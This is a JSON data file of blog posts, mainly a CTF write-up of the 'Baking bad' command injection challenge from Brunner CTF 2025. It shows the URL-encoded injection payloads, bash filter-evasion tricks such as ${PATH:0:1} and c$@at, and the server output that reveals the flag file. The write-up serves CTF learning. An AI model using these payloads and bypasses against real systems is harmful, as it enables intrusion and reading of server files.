[{"slug":"BakingBad-writeup","category":"blog","title":"Baking bad -  Brunner CTF 2025","description":"CTF write-up about an easy command injection vulnerability.","tags":["ctf","command-injection","web"],"body":"\nCreated time: **August 23, 2025 4:22 PM**  \nCategory: **web**  \nLast updated time: **September 23, 2025 4:23 PM**  \nVuln type: **Command Injection**  \nStatus: **Done**  \nCTF: **Brunner CTF**\n\n---\n\n## Challenge Description\n\n**Points:** 100  \n**Difficulty:** Easy  \n**Author:** 0xjeppe  \n\nThis new kid on the block, Bake'n'berg, has taken over the market with some new dough that has 99.2% purity. Ours is not even 60%!\n\nOur bakers have been trying to come up with a new P2P recipe, trying all sorts of weird ingredients to raise the purity, but it's so costly this way.\n\nLuckily, the developers at Brunnerne have come up with a `bash -c 'recipe'` that can simulate the baking process.  \nThis way we can test ingredients in a simulator to find ingredients that result in a higher purity â€” without wasting any resources.\n\n---\n\n## Analysis\n\nThe page looks like a web app for checking the purity of some ingredients.\n\nThe request being made is a **GET** with a parameter `ingredient=` which then returns the purity of the corresponding ingredient.\n\n<aside>\nðŸ“Œ At this point, we can conclude with 99% certainty that we are dealing with a **Command Injection** vulnerability.\n</aside>\n\n---\n\n## Recommendations\n\nThe proposed solution will therefore be based on injecting shell commands into the backend to obtain the flag.\n\n---\n\n## Exploitation\n\nFirst, letâ€™s check if our assumption actually produces a result.\n\nWe try with this simple payload:\n\n```http\n\nGET /?ingredient=\\nls\n````\n\nWe get the following error response from the server, but the request seems to have gone through:\n\n```html\n\nIllegal character detected!s\n```\n\nAt this point I realize I havenâ€™t considered URL encoding, so I try again like this:\n\n```http\n\nGET /?ingredient=%0als\n```\n\nAnd finally get this response:\n\n```txt\n\nNo ingredient!\nindex.php\nquality.sh\nstatics\n```\n\nâœ… **Injection successful**\n\nNow I just need to check in which directory the flag is located:\n\n```http\n\nGET /?ingredient=%0als%09..\n```\n\nAnd I get this response:\n\n```txt\n\nNo ingredient!\nbakingbad\nhtml\n```\n\nOkâ€¦ I need to go further back, but how???\n\nI try a series of payloads:\n\n```http\n\nGET /?ingredient=%0als%09../..\nGET /?ingredient=%0als%09..%2f..\nGET /?ingredient=%0als%09..%252f..\nGET /?ingredient=%0a{ls,../..}\nGET /?ingredient=%0a{ls,..}|{ls,..}\n```\n\nNo luck. I need to get `/` somehow without writing it explicitly:\n\n```http\n\nGET /?ingredient=%0a{ls,..${PATH:0:1}..${PATH:0:1}..}\n```\n\nUsing `${PATH:0:1}` we obtain `/`, which repeated a few times allows us to discover the flagâ€™s location:\n\n```txt\n\nNo ingredient!\nbin\nboot\ndev\netc\nflag.txt # found yey ðŸŽ¯\nhome\nlib\nlib.usr-is-merged\nlib64\nmedia\nmnt\nopt\nproc\nroot\nrun\nsbin\nsrv\nsys\ntmp\nusr\nvar\n```\n\nNow I just need to replace `ls` with `cat`, right??\n\n```http\n\nGET /?ingredient=%0a{cat,..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt}\n```\n\nResponse:\n\n```html\n\nIllegal command detected!\n```\n\nToo good to be true ðŸ¥²\n\nAfter endless attempts and research I come across this filter command bypass `$@` which works like the backslash `\\`:\n\n```http\n\nGET /?ingredient=%0a{c$@at,..${PATH:0:1}..${PATH:0:1}..${PATH:0:1}flag.txt}\n```\n\nAnd finally:\n\n```txt\n\nNo ingredient!\nbrunner{d1d_1_f0rg37_70_b4n_s0m3_ch4rz?}\n```\n\nðŸŽ‰ **Flagged** âœ…"},{"slug":"SpeedNet-writeup","category":"blog","title":"SpeedNet -  HTB BugBounty CTF 2025","description":"CTF write-up about GraphQL Attack.","tags":["ctf","GraphQL","web"],"body":""}]